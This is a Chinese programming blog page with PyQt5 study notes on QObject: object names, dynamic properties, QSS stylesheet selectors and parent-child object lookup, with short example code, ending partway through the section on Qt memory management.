<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>PyQt5的笔记（中-1） - 编程随想</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="PyQt5的笔记（中-1）" />
<meta property="og:description" content="PyQt5的笔记（上）连接：
(1条消息) PyQt5的笔记（上）_我行我素，向往自由的博客-CSDN博客
目录
3.QObject
3.1 继承的父类 3.2 对象的名称和属性设置-API
3.2.1 API
3.2.2 案例
3.3 父子对象的操作
3.3.1 API 3.3.2 Qt内存管理机制
3.3.3 应用场景与案例
3.4 信号与槽机制
3.4.1 API
3.4.2 案例
3.5 类型判定
3.5.1 API 3.5.2 案例
3.6 对象删除
3.7 事件处理
3.8 定时器
3.8.1 API
3.8.2 案例
4.QAbstractButton
4.1 子类化抽象类
4.2 文本设置
4.3 图标相关
4.4 设置快捷键 4.5 自动重复
4.6 状态读取
4.7 排他性
4.8 模拟点击
4.8.1 代码模拟鼠标点击 4.8.2 设置点击有效区域
4.9 可用信号
5.QPushButton 5.1 构造函数" />
<meta property="og:type" content="article" />
<meta property="og:url" content="/posts/d291c3dabb3c160585d0ef732991cfdb/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2022-07-15T14:48:32+08:00" />
<meta property="article:modified_time" content="2022-07-15T14:48:32+08:00" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程随想" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程随想</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">PyQt5的笔记（中-1）</h1>
			
		</header>
		<div class="content post__content clearfix">
			
<div id="content_views" class="htmledit_views">
                    <p>PyQt5的笔记（上）连接：</p> 
<p><a href="https://blog.csdn.net/m0_58086930/article/details/125727783?csdn_share_tail=%7B%22type%22%3A%22blog%22%2C%22rType%22%3A%22article%22%2C%22rId%22%3A%22125727783%22%2C%22source%22%3A%22m0_58086930%22%7D&amp;ctrtid=Xu5Fg" title="(1条消息) PyQt5的笔记（上）_我行我素，向往自由的博客-CSDN博客">(1条消息) PyQt5的笔记（上）_我行我素，向往自由的博客-CSDN博客</a></p> 
<p id="main-toc"><strong>目录</strong></p> 
<p id="3.QObject-toc" style="margin-left:0px;"><a href="#3.QObject" rel="nofollow">3.QObject</a></p> 
<p id="3.1%20%E7%BB%A7%E6%89%BF%E7%9A%84%E7%88%B6%E7%B1%BB%C2%A0-toc" style="margin-left:40px;"><a href="#3.1%20%E7%BB%A7%E6%89%BF%E7%9A%84%E7%88%B6%E7%B1%BB%C2%A0" rel="nofollow">3.1 继承的父类 </a></p> 
<p id="3.2%20%E5%AF%B9%E8%B1%A1%E7%9A%84%E5%90%8D%E7%A7%B0%E5%92%8C%E5%B1%9E%E6%80%A7%E8%AE%BE%E7%BD%AE-API-toc" style="margin-left:40px;"><a href="#3.2%20%E5%AF%B9%E8%B1%A1%E7%9A%84%E5%90%8D%E7%A7%B0%E5%92%8C%E5%B1%9E%E6%80%A7%E8%AE%BE%E7%BD%AE-API" rel="nofollow">3.2 对象的名称和属性设置-API</a></p> 
<p id="3.2.1%20API-toc" style="margin-left:80px;"><a href="#3.2.1%20API" rel="nofollow">3.2.1 API</a></p> 
<p id="3.2.2%20%E6%A1%88%E4%BE%8B-toc" style="margin-left:80px;"><a href="#3.2.2%20%E6%A1%88%E4%BE%8B" rel="nofollow">3.2.2 案例</a></p> 
<p id="3.3%20%E7%88%B6%E5%AD%90%E5%AF%B9%E8%B1%A1%E7%9A%84%E6%93%8D%E4%BD%9C-toc" style="margin-left:40px;"><a href="#3.3%20%E7%88%B6%E5%AD%90%E5%AF%B9%E8%B1%A1%E7%9A%84%E6%93%8D%E4%BD%9C" rel="nofollow">3.3 父子对象的操作</a></p> 
<p id="3.3.1%20API%C2%A0-toc" style="margin-left:80px;"><a href="#3.3.1%20API%C2%A0" rel="nofollow">3.3.1 API </a></p> 
<p id="3.3.2%20Qt%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86%E6%9C%BA%E5%88%B6-toc" style="margin-left:80px;"><a href="#3.3.2%20Qt%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86%E6%9C%BA%E5%88%B6" rel="nofollow">3.3.2 Qt内存管理机制</a></p> 
<p id="3.3.3%20%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF%E4%B8%8E%E6%A1%88%E4%BE%8B-toc" style="margin-left:80px;"><a href="#3.3.3%20%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF%E4%B8%8E%E6%A1%88%E4%BE%8B" rel="nofollow">3.3.3 应用场景与案例</a></p> 
<p id="3.4%20%E4%BF%A1%E5%8F%B7%E4%B8%8E%E6%A7%BD%E6%9C%BA%E5%88%B6-toc" style="margin-left:40px;"><a href="#3.4%20%E4%BF%A1%E5%8F%B7%E4%B8%8E%E6%A7%BD%E6%9C%BA%E5%88%B6" rel="nofollow">3.4 信号与槽机制</a></p> 
<p id="3.4.1%20API-toc" style="margin-left:80px;"><a href="#3.4.1%20API" rel="nofollow">3.4.1 API</a></p> 
<p id="3.4.2%20%E6%A1%88%E4%BE%8B-toc" style="margin-left:80px;"><a href="#3.4.2%20%E6%A1%88%E4%BE%8B" rel="nofollow">3.4.2 案例</a></p> 
<p id="3.5%20%E7%B1%BB%E5%9E%8B%E5%88%A4%E5%AE%9A-toc" style="margin-left:40px;"><a href="#3.5%20%E7%B1%BB%E5%9E%8B%E5%88%A4%E5%AE%9A" rel="nofollow">3.5 类型判定</a></p> 
<p id="3.5.1%20API%C2%A0-toc" style="margin-left:80px;"><a href="#3.5.1%20API%C2%A0" rel="nofollow">3.5.1 API </a></p> 
<p id="3.5.2%20%E6%A1%88%E4%BE%8B-toc" style="margin-left:80px;"><a href="#3.5.2%20%E6%A1%88%E4%BE%8B" rel="nofollow">3.5.2 案例</a></p> 
<p id="3.6%20%E5%AF%B9%E8%B1%A1%E5%88%A0%E9%99%A4-toc" style="margin-left:40px;"><a href="#3.6%20%E5%AF%B9%E8%B1%A1%E5%88%A0%E9%99%A4" rel="nofollow">3.6 对象删除</a></p> 
<p id="3.7%20%E4%BA%8B%E4%BB%B6%E5%A4%84%E7%90%86-toc" style="margin-left:40px;"><a href="#3.7%20%E4%BA%8B%E4%BB%B6%E5%A4%84%E7%90%86" rel="nofollow">3.7 事件处理</a></p> 
<p id="3.8%20%E5%AE%9A%E6%97%B6%E5%99%A8-toc" style="margin-left:40px;"><a href="#3.8%20%E5%AE%9A%E6%97%B6%E5%99%A8" rel="nofollow">3.8 定时器</a></p> 
<p id="3.8.1%20API-toc" style="margin-left:80px;"><a href="#3.8.1%20API" rel="nofollow">3.8.1 API</a></p> 
<p id="3.8.2%20%E6%A1%88%E4%BE%8B-toc" style="margin-left:80px;"><a href="#3.8.2%20%E6%A1%88%E4%BE%8B" rel="nofollow">3.8.2 案例</a></p> 
<p id="4.QAbstractButton-toc" style="margin-left:0px;"><a href="#4.QAbstractButton" rel="nofollow">4.QAbstractButton</a></p> 
<p id="4.1%20%E5%AD%90%E7%B1%BB%E5%8C%96%E6%8A%BD%E8%B1%A1%E7%B1%BB-toc" style="margin-left:40px;"><a href="#4.1%20%E5%AD%90%E7%B1%BB%E5%8C%96%E6%8A%BD%E8%B1%A1%E7%B1%BB" rel="nofollow">4.1 子类化抽象类</a></p> 
<p id="4.2%20%E6%96%87%E6%9C%AC%E8%AE%BE%E7%BD%AE-toc" style="margin-left:40px;"><a href="#4.2%20%E6%96%87%E6%9C%AC%E8%AE%BE%E7%BD%AE" rel="nofollow">4.2 文本设置</a></p> 
<p id="4.3%20%E5%9B%BE%E6%A0%87%E7%9B%B8%E5%85%B3-toc" style="margin-left:40px;"><a href="#4.3%20%E5%9B%BE%E6%A0%87%E7%9B%B8%E5%85%B3" rel="nofollow">4.3 图标相关</a></p> 
<p id="4.4%20%E8%AE%BE%E7%BD%AE%E5%BF%AB%E6%8D%B7%E9%94%AE%C2%A0-toc" style="margin-left:40px;"><a href="#4.4%20%E8%AE%BE%E7%BD%AE%E5%BF%AB%E6%8D%B7%E9%94%AE%C2%A0" rel="nofollow">4.4 设置快捷键 </a></p> 
<p id="4.5%20%E8%87%AA%E5%8A%A8%E9%87%8D%E5%A4%8D-toc" style="margin-left:40px;"><a href="#4.5%20%E8%87%AA%E5%8A%A8%E9%87%8D%E5%A4%8D" rel="nofollow">4.5 自动重复</a></p> 
<p id="4.6%20%E7%8A%B6%E6%80%81%E8%AF%BB%E5%8F%96-toc" style="margin-left:40px;"><a href="#4.6%20%E7%8A%B6%E6%80%81%E8%AF%BB%E5%8F%96" rel="nofollow">4.6 状态读取</a></p> 
<p id="4.7%20%E6%8E%92%E4%BB%96%E6%80%A7-toc" style="margin-left:40px;"><a href="#4.7%20%E6%8E%92%E4%BB%96%E6%80%A7" rel="nofollow">4.7 排他性</a></p> 
<p id="4.8%20%E6%A8%A1%E6%8B%9F%E7%82%B9%E5%87%BB-toc" style="margin-left:40px;"><a href="#4.8%20%E6%A8%A1%E6%8B%9F%E7%82%B9%E5%87%BB" rel="nofollow">4.8 模拟点击</a></p> 
<p id="4.8.1%20%E4%BB%A3%E7%A0%81%E6%A8%A1%E6%8B%9F%E9%BC%A0%E6%A0%87%E7%82%B9%E5%87%BB%C2%A0-toc" style="margin-left:80px;"><a href="#4.8.1%20%E4%BB%A3%E7%A0%81%E6%A8%A1%E6%8B%9F%E9%BC%A0%E6%A0%87%E7%82%B9%E5%87%BB%C2%A0" rel="nofollow">4.8.1 代码模拟鼠标点击 </a></p> 
<p id="4.8.2%20%E8%AE%BE%E7%BD%AE%E7%82%B9%E5%87%BB%E6%9C%89%E6%95%88%E5%8C%BA%E5%9F%9F-toc" style="margin-left:80px;"><a href="#4.8.2%20%E8%AE%BE%E7%BD%AE%E7%82%B9%E5%87%BB%E6%9C%89%E6%95%88%E5%8C%BA%E5%9F%9F" rel="nofollow">4.8.2 设置点击有效区域</a></p> 
<p id="4.9%20%E5%8F%AF%E7%94%A8%E4%BF%A1%E5%8F%B7-toc" style="margin-left:40px;"><a href="#4.9%20%E5%8F%AF%E7%94%A8%E4%BF%A1%E5%8F%B7" rel="nofollow">4.9 可用信号</a></p> 
<p id="5.QPushButton%C2%A0-toc" style="margin-left:0px;"><a href="#5.QPushButton%C2%A0" rel="nofollow">5.QPushButton </a></p> 
<p id="5.1%20%E6%9E%84%E9%80%A0%E5%87%BD%E6%95%B0-toc" style="margin-left:40px;"><a href="#5.1%20%E6%9E%84%E9%80%A0%E5%87%BD%E6%95%B0" rel="nofollow">5.1 构造函数</a></p> 
<p id="5.2%20%E8%8F%9C%E5%8D%95%E8%AE%BE%E7%BD%AE-toc" style="margin-left:40px;"><a href="#5.2%20%E8%8F%9C%E5%8D%95%E8%AE%BE%E7%BD%AE" rel="nofollow">5.2 菜单设置</a></p> 
<p id="5.3%20%E6%89%81%E5%B9%B3%E5%8C%96-toc" style="margin-left:40px;"><a href="#5.3%20%E6%89%81%E5%B9%B3%E5%8C%96" rel="nofollow">5.3 扁平化</a></p> 
<p id="5.4%20%E9%BB%98%E8%AE%A4%E5%A4%84%E7%90%86-toc" style="margin-left:40px;"><a href="#5.4%20%E9%BB%98%E8%AE%A4%E5%A4%84%E7%90%86" rel="nofollow">5.4 默认处理</a></p> 
<p id="5.5%20%E5%8F%B3%E9%94%AE%E8%8F%9C%E5%8D%95-toc" style="margin-left:40px;"><a href="#5.5%20%E5%8F%B3%E9%94%AE%E8%8F%9C%E5%8D%95" rel="nofollow">5.5 右键菜单</a></p> 
<p id="6.QCommandLinkButton-toc" style="margin-left:0px;"><a href="#6.QCommandLinkButton" rel="nofollow">6.QCommandLinkButton</a></p> 
<p id="7.QToolButton-toc" style="margin-left:0px;"><a href="#7.QToolButton" rel="nofollow">7.QToolButton</a></p> 
<p id="7.1%20%E5%88%9B%E5%BB%BA%E4%B8%8E%E5%9F%BA%E6%9C%AC%E6%98%BE%E7%A4%BA%E6%93%8D%E4%BD%9C%C2%A0-toc" style="margin-left:40px;"><a href="#7.1%20%E5%88%9B%E5%BB%BA%E4%B8%8E%E5%9F%BA%E6%9C%AC%E6%98%BE%E7%A4%BA%E6%93%8D%E4%BD%9C%C2%A0" rel="nofollow">7.1 创建与基本显示操作 </a></p> 
<p id="7.2%20%E5%B7%A5%E5%85%B7%E6%8C%89%E9%92%AE%E6%A0%B7%E5%BC%8F%E8%AE%BE%E7%BD%AE-toc" style="margin-left:40px;"><a href="#7.2%20%E5%B7%A5%E5%85%B7%E6%8C%89%E9%92%AE%E6%A0%B7%E5%BC%8F%E8%AE%BE%E7%BD%AE" rel="nofollow">7.2 工具按钮样式设置</a></p> 
<p id="7.3%20%E7%AE%AD%E5%A4%B4%E7%B1%BB%E5%9E%8B%E6%93%8D%E4%BD%9C-toc" style="margin-left:40px;"><a href="#7.3%20%E7%AE%AD%E5%A4%B4%E7%B1%BB%E5%9E%8B%E6%93%8D%E4%BD%9C" rel="nofollow">7.3 箭头类型操作</a></p> 
<p id="7.4%20%E8%87%AA%E5%8A%A8%E6%8F%90%E5%8D%87%E5%8A%9F%E8%83%BD-toc" style="margin-left:40px;"><a href="#7.4%20%E8%87%AA%E5%8A%A8%E6%8F%90%E5%8D%87%E5%8A%9F%E8%83%BD" rel="nofollow">7.4 自动提升功能</a></p> 
<p id="7.5%20%E8%8F%9C%E5%8D%95%E5%92%8C%E5%BC%B9%E5%87%BA%E6%A8%A1%E5%BC%8F-toc" style="margin-left:40px;"><a href="#7.5%20%E8%8F%9C%E5%8D%95%E5%92%8C%E5%BC%B9%E5%87%BA%E6%A8%A1%E5%BC%8F" rel="nofollow">7.5 菜单和弹出模式</a></p> 
<p id="7.6%20%E5%8F%AF%E7%94%A8%E4%BF%A1%E5%8F%B7-toc" style="margin-left:40px;"><a href="#7.6%20%E5%8F%AF%E7%94%A8%E4%BF%A1%E5%8F%B7" rel="nofollow">7.6 可用信号</a></p> 
<p id="8.QRadioButton%E5%8D%95%E9%80%89%E6%A1%86-toc" style="margin-left:0px;"><a href="#8.QRadioButton%E5%8D%95%E9%80%89%E6%A1%86" rel="nofollow">8.QRadioButton单选框</a></p> 
<p id="8.1%20%E5%88%9B%E5%BB%BA%E4%B8%8E%E5%9F%BA%E6%9C%AC%E8%AE%BE%E7%BD%AE%C2%A0-toc" style="margin-left:40px;"><a href="#8.1%20%E5%88%9B%E5%BB%BA%E4%B8%8E%E5%9F%BA%E6%9C%AC%E8%AE%BE%E7%BD%AE%C2%A0" rel="nofollow">8.1 创建与基本设置 </a></p> 
<p id="8.2%20%E4%BF%A1%E5%8F%B7%E4%BD%BF%E7%94%A8-toc" style="margin-left:40px;"><a href="#8.2%20%E4%BF%A1%E5%8F%B7%E4%BD%BF%E7%94%A8" rel="nofollow">8.2 信号使用</a></p> 
<p id="8.3%20%E5%A4%9A%E7%BB%84%E4%BA%92%E6%96%A5%E9%97%AE%E9%A2%98-toc" style="margin-left:40px;"><a href="#8.3%20%E5%A4%9A%E7%BB%84%E4%BA%92%E6%96%A5%E9%97%AE%E9%A2%98" rel="nofollow">8.3 多组互斥问题</a></p> 
<p id="9.QButtonGroup-toc" style="margin-left:0px;"><a href="#9.QButtonGroup" rel="nofollow">9.QButtonGroup</a></p> 
<p id="9.1%20%E5%88%9B%E5%BB%BA%E5%92%8C%E6%B7%BB%E5%8A%A0%E6%8C%89%E9%92%AE%C2%A0-toc" style="margin-left:40px;"><a href="#9.1%20%E5%88%9B%E5%BB%BA%E5%92%8C%E6%B7%BB%E5%8A%A0%E6%8C%89%E9%92%AE%C2%A0" rel="nofollow">9.1 创建和添加按钮 </a></p> 
<p id="9.2%20%E6%9F%A5%E7%9C%8B%E6%8C%89%E9%92%AE-toc" style="margin-left:40px;"><a href="#9.2%20%E6%9F%A5%E7%9C%8B%E6%8C%89%E9%92%AE" rel="nofollow">9.2 查看按钮</a></p> 
<p id="9.3%20%E7%A7%BB%E9%99%A4%E7%BB%84%E5%85%B3%E7%B3%BB-toc" style="margin-left:40px;"><a href="#9.3%20%E7%A7%BB%E9%99%A4%E7%BB%84%E5%85%B3%E7%B3%BB" rel="nofollow">9.3 移除组关系</a></p> 
<p id="9.4%20%E7%BB%91%E5%AE%9A%E5%92%8C%E8%8E%B7%E5%8F%96ID-toc" style="margin-left:40px;"><a href="#9.4%20%E7%BB%91%E5%AE%9A%E5%92%8C%E8%8E%B7%E5%8F%96ID" rel="nofollow">9.4 绑定和获取ID</a></p> 
<p id="9.5%20%E7%8B%AC%E5%8D%A0%E6%93%8D%E4%BD%9C-toc" style="margin-left:40px;"><a href="#9.5%20%E7%8B%AC%E5%8D%A0%E6%93%8D%E4%BD%9C" rel="nofollow">9.5 独占操作</a></p> 
<p id="9.6%20%E4%BF%A1%E5%8F%B7%E4%BD%BF%E7%94%A8-toc" style="margin-left:40px;"><a href="#9.6%20%E4%BF%A1%E5%8F%B7%E4%BD%BF%E7%94%A8" rel="nofollow">9.6 信号使用</a></p> 
<p id="10.QCheckBox%E5%A4%9A%E9%80%89%E6%A1%86-toc" style="margin-left:0px;"><a href="#10.QCheckBox%E5%A4%9A%E9%80%89%E6%A1%86" rel="nofollow">10.QCheckBox多选框</a></p> 
<p id="10.1%20%E5%8A%9F%E8%83%BD%E4%BD%BF%E7%94%A8-toc" style="margin-left:40px;"><a href="#10.1%20%E5%8A%9F%E8%83%BD%E4%BD%BF%E7%94%A8" rel="nofollow">10.1 功能使用</a></p> 
<p id="10.2%20%E4%BF%A1%E5%8F%B7-toc" style="margin-left:40px;"><a href="#10.2%20%E4%BF%A1%E5%8F%B7" rel="nofollow">10.2 信号</a></p> 
<p id="11.QLineEdit-toc" style="margin-left:0px;"><a href="#11.QLineEdit" rel="nofollow">11.QLineEdit</a></p> 
<p id="11.1%20%E6%8E%A7%E4%BB%B6%E5%88%9B%E5%BB%BA%E3%80%81%E6%96%87%E6%9C%AC%E7%9A%84%E8%AE%BE%E7%BD%AE%E8%8E%B7%E5%8F%96-toc" style="margin-left:40px;"><a href="#11.1%20%E6%8E%A7%E4%BB%B6%E5%88%9B%E5%BB%BA%E3%80%81%E6%96%87%E6%9C%AC%E7%9A%84%E8%AE%BE%E7%BD%AE%E8%8E%B7%E5%8F%96" rel="nofollow">11.1 控件创建、文本的设置获取</a></p> 
<p id="11.2%20%E8%BE%93%E5%87%BA%E6%A8%A1%E5%BC%8F-toc" style="margin-left:40px;"><a href="#11.2%20%E8%BE%93%E5%87%BA%E6%A8%A1%E5%BC%8F" rel="nofollow">11.2 输出模式</a></p> 
<p id="11.3%20%E5%8D%A0%E4%BD%8D%E6%96%87%E6%9C%AC%E8%AE%BE%E7%BD%AE-toc" style="margin-left:40px;"><a href="#11.3%20%E5%8D%A0%E4%BD%8D%E6%96%87%E6%9C%AC%E8%AE%BE%E7%BD%AE" rel="nofollow">11.3 占位文本设置</a></p> 
<p id="11.4%20%E6%B8%85%E7%A9%BA%E6%8C%89%E9%92%AE%E7%9A%84%E8%AE%BE%E7%BD%AE-toc" style="margin-left:40px;"><a href="#11.4%20%E6%B8%85%E7%A9%BA%E6%8C%89%E9%92%AE%E7%9A%84%E8%AE%BE%E7%BD%AE" rel="nofollow">11.4 清空按钮的设置</a></p> 
<p id="11.5%20%E6%B7%BB%E5%8A%A0%E8%87%AA%E5%AE%9A%E4%B9%89%E8%A1%8C%E4%B8%BA-toc" style="margin-left:40px;"><a href="#11.5%20%E6%B7%BB%E5%8A%A0%E8%87%AA%E5%AE%9A%E4%B9%89%E8%A1%8C%E4%B8%BA" rel="nofollow">11.5 添加自定义行为</a></p> 
<p id="11.6%20%E8%87%AA%E5%8A%A8%E8%A1%A5%E5%85%A8%E8%81%94%E6%83%B3-toc" style="margin-left:40px;"><a href="#11.6%20%E8%87%AA%E5%8A%A8%E8%A1%A5%E5%85%A8%E8%81%94%E6%83%B3" rel="nofollow">11.6 自动补全联想</a></p> 
<p id="11.7%20%E8%BE%93%E5%85%A5%E6%96%87%E6%9C%AC%E5%86%85%E5%AE%B9%E9%99%90%E5%88%B6-toc" style="margin-left:40px;"><a href="#11.7%20%E8%BE%93%E5%85%A5%E6%96%87%E6%9C%AC%E5%86%85%E5%AE%B9%E9%99%90%E5%88%B6" rel="nofollow">11.7 输入文本内容限制</a></p> 
<p id="11.7.1%20%E9%95%BF%E5%BA%A6%E5%92%8C%E5%8F%AA%E8%AF%BB%E9%99%90%E5%88%B6-toc" style="margin-left:80px;"><a href="#11.7.1%20%E9%95%BF%E5%BA%A6%E5%92%8C%E5%8F%AA%E8%AF%BB%E9%99%90%E5%88%B6" rel="nofollow">11.7.1 长度和只读限制</a></p> 
<p id="11.7.2%C2%A0%20%E9%AA%8C%E8%AF%81%E5%99%A8%E7%9A%84%E4%BD%BF%E7%94%A8-%E8%AE%BE%E5%AE%9A%E7%94%A8%E6%88%B7%E8%BE%93%E5%85%A5%E8%A7%84%E5%88%99-toc" style="margin-left:80px;"><a href="#11.7.2%C2%A0%20%E9%AA%8C%E8%AF%81%E5%99%A8%E7%9A%84%E4%BD%BF%E7%94%A8-%E8%AE%BE%E5%AE%9A%E7%94%A8%E6%88%B7%E8%BE%93%E5%85%A5%E8%A7%84%E5%88%99" rel="nofollow">11.7.2  验证器的使用-设定用户输入规则</a></p> 
<p id="11.7.3%20%E6%8E%A9%E7%A0%81%E9%99%90%E5%88%B6-toc" style="margin-left:80px;"><a href="#11.7.3%20%E6%8E%A9%E7%A0%81%E9%99%90%E5%88%B6" rel="nofollow">11.7.3 掩码限制</a></p> 
<p id="11.8%20%E6%96%87%E6%9C%AC%E4%BF%AE%E6%94%B9%E7%8A%B6%E6%80%81-toc" style="margin-left:40px;"><a href="#11.8%20%E6%96%87%E6%9C%AC%E4%BF%AE%E6%94%B9%E7%8A%B6%E6%80%81" rel="nofollow">11.8 文本修改状态</a></p> 
<p id="11.9%20%E5%85%89%E6%A0%87%E4%BD%8D%E7%BD%AE%E6%8E%A7%E5%88%B6-toc" style="margin-left:40px;"><a href="#11.9%20%E5%85%89%E6%A0%87%E4%BD%8D%E7%BD%AE%E6%8E%A7%E5%88%B6" rel="nofollow">11.9 光标位置控制</a></p> 
<p id="11.10%20%E6%96%87%E6%9C%AC%E8%BE%B9%E8%B7%9D%E8%AE%BE%E5%AE%9A-toc" style="margin-left:40px;"><a href="#11.10%20%E6%96%87%E6%9C%AC%E8%BE%B9%E8%B7%9D%E8%AE%BE%E5%AE%9A" rel="nofollow">11.10 文本边距设定</a></p> 
<p id="11.11%20%E5%AF%B9%E9%BD%90%E6%96%B9%E5%BC%8F%C2%A0-toc" style="margin-left:40px;"><a href="#11.11%20%E5%AF%B9%E9%BD%90%E6%96%B9%E5%BC%8F%C2%A0" rel="nofollow">11.11 对齐方式 </a></p> 
<p id="11.12%20%E5%B8%B8%E7%94%A8%E7%BC%96%E8%BE%91%E5%8A%9F%E8%83%BD-toc" style="margin-left:40px;"><a href="#11.12%20%E5%B8%B8%E7%94%A8%E7%BC%96%E8%BE%91%E5%8A%9F%E8%83%BD" rel="nofollow">11.12 常用编辑功能</a></p> 
<p id="11.13%20%E4%BF%A1%E5%8F%B7%E7%9A%84%E4%BD%BF%E7%94%A8-toc" style="margin-left:40px;"><a href="#11.13%20%E4%BF%A1%E5%8F%B7%E7%9A%84%E4%BD%BF%E7%94%A8" rel="nofollow">11.13 信号的使用</a></p> 
<hr id="hr-toc"> 
<p></p> 
<h2 id="3.QObject">3.QObject</h2> 
<h3 id="3.1%20%E7%BB%A7%E6%89%BF%E7%9A%84%E7%88%B6%E7%B1%BB%C2%A0">3.1 继承的父类 </h3> 
<blockquote> 
 <p><strong>不同的控件有：</strong></p> 
 <ul><li><strong>相同的共性：</strong>名字、矩形区域、位置、大小、可以设置样式...</li><li><strong>不同的特性：</strong>展示内容、接收输入、用户交互、容器、框架...</li></ul> 
</blockquote> 
<p><img alt="" height="251" src="https://images2.imgbox.com/9c/83/gxXTAbaw_o.png" width="1200"></p> 
<p><img alt="" height="267" src="https://images2.imgbox.com/7a/b5/xzux68Iw_o.png" width="1200"></p> 
<pre><code>pmros=QObject.mro()
    for mro in mros:
        print(mro)</code></pre> 
<p>运行结果：</p> 
<p><img alt="" height="240" src="https://images2.imgbox.com/a6/65/RRZx3KWn_o.png" width="623"></p> 
<h3 id="3.2%20%E5%AF%B9%E8%B1%A1%E7%9A%84%E5%90%8D%E7%A7%B0%E5%92%8C%E5%B1%9E%E6%80%A7%E8%AE%BE%E7%BD%AE-API">3.2 对象的名称和属性设置-API</h3> 
<h4 id="3.2.1%20API">3.2.1 API</h4> 
<p><img alt="" height="381" src="https://images2.imgbox.com/ea/9c/0MaIiNMf_o.png" width="1142"></p> 
<pre><code># 测试API
obj=QObject()

obj.setObjectName('notice')
print('objectName=',obj.objectName())#notice

#添加属性和值
obj.setProperty('notice_level','error')
obj.setProperty('notice_level','warning')
print('notice_level=',obj.property('notice_level'))#warning
#获取对象中所有通过setProPerty()函数设置的属性名称
print(obj.dynamicPropertyNames())#[PyQt5.QtCore.QByteArray(b'notice_level')]
</code></pre> 
<p>运行结果：</p> 
<p><img alt="" height="212" src="https://images2.imgbox.com/bf/6b/1eQv5chQ_o.png" width="707"></p> 
<h4 id="3.2.2%20%E6%A1%88%E4%BE%8B">3.2.2 案例</h4> 
<p><img alt="" height="540" src="https://images2.imgbox.com/6e/6f/E3jYNEoL_o.png" width="993"></p> 
<p>样式表中的内容如下：  </p> 
<pre><code>#QObject.qss文件中的内容
QLabel#notice{
    font-size:20px;
    color:gray;
    border:1px solid gray;
    border-radius:8px;
}
QLabel#notice[notice_level=normal]{
    color:green;
    border-color:green;
}
QLabel#notice[notice_level=warning]{
    color:yellow;
    border-color:yellow;
}
QLabel#notice[notice_level=error]{
    color:red;
    border-color:red;
}</code></pre> 
<p>测试代码： </p> 
<pre><code>with open('./QOBject.qss','r') as f:
    qApp.setStyleSheet(f.read())#样式表中能匹配到的样式
    # ==&gt; 同label.setStyleSheet('font-size:20px;color:red;')#样式表
label=QLabel(self)
label.setObjectName('notice')#这个样式可以应用，因为ID是notice
label.setText('正常正常.')

label2 = QLabel(self)
label2.setObjectName('notice')
label2.setProperty('notice_level','warning')
label2.move(100,100)#这个样式也会
label2.setText('警告警告。。。')

label3 = QLabel(self)
label3.setObjectName('no_name')
label3.move(150, 150)  # 这个样式不会，因为名字是no_name,匹配不到
label3.setText('没有名字！')

label4 = QLabel(self)
label4.setObjectName('notice')
label4.setProperty('notice_level','error')
label4.move(200, 200)
label4.setText('错误错误！！！')

btn=QPushButton(self)
btn.setObjectName('notice')
btn.move(50,50)
btn.setText('btn')

#label.setStyleSheet('font-size:20px;color:red;')#样式表</code></pre> 
<p>运行结果图：</p> 
<p><img alt="" height="548" src="https://images2.imgbox.com/da/ae/RvsfFUme_o.png" width="514"></p> 
<p></p> 
<h3 id="3.3%20%E7%88%B6%E5%AD%90%E5%AF%B9%E8%B1%A1%E7%9A%84%E6%93%8D%E4%BD%9C">3.3 父子对象的操作</h3> 
<p> </p> 
<h4 id="%E2%80%8B%E7%BC%96%E8%BE%91"><img alt="" height="464" src="https://images2.imgbox.com/b5/94/Fd7HgN9j_o.png" width="888"></h4> 
<p><img alt="" height="341" src="https://images2.imgbox.com/ec/ca/etlreR7u_o.png" width="894"></p> 
<p> </p> 
<h4 id="3.3.1%20API%C2%A0">3.3.1 API </h4> 
<pre><code>obj0 = QObject()
obj1 = QObject()
obj2 = QObject()
obj3 = QObject()
obj4 = QObject()
obj5 = QObject()
print('obj0=', obj0)
print('obj1=', obj1)
print('obj2=', obj2)
print('obj3=', obj3)
print('obj4=', obj4)
print('obj5=', obj5)

obj1.setParent(obj0)  # 设置父类
obj2.setParent(obj0)
obj3.setParent(obj1)
obj4.setParent(obj2)
obj5.setParent(obj2)
# lable=QLabel()
# lable.setParent(obj0)  #报错，不可建立父子关系
# print('lable=',lable)

obj0.setObjectName('0')
obj1.setObjectName('1')
obj2.setObjectName('2')
obj3.setObjectName('3')
obj4.setObjectName('4')
obj5.setObjectName('5')

print('obj0的直接(一级)子类：',obj0.children())
print('obj4的直接(一级)父类：',obj4.parent())
print('obj0找到的QObject类孩子中的第一个：',obj0.findChild(QObject))
print('obj0的儿子obj2：',obj0.findChild(QObject,'2'))
print('obj0的孙子obj3是：', obj0.findChild(QObject,'3'))#这个是可以的【递归/迭代】Qt.FindChildrenRecursively
print('obj0的孙子obj4是(找不到)：',obj0.findChild(QObject,'4',Qt.FindDirectChildrenOnly))#只查找直接子对象
print('obj0的所有子子孙孙：',obj0.findChildren(QObject))
    </code></pre> 
<p>运行结果：</p> 
<p><img alt="" height="603" src="https://images2.imgbox.com/8a/1b/VidUCiLx_o.png" width="1200"></p> 
<h4 id="3.3.2%20Qt%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86%E6%9C%BA%E5%88%B6">3.3.2 Qt内存管理机制</h4> 
<p><img alt="" height="385" src="https://images2.imgbox.com/c3/6f/YdeTEyjH_o.png" width="1078"></p> 
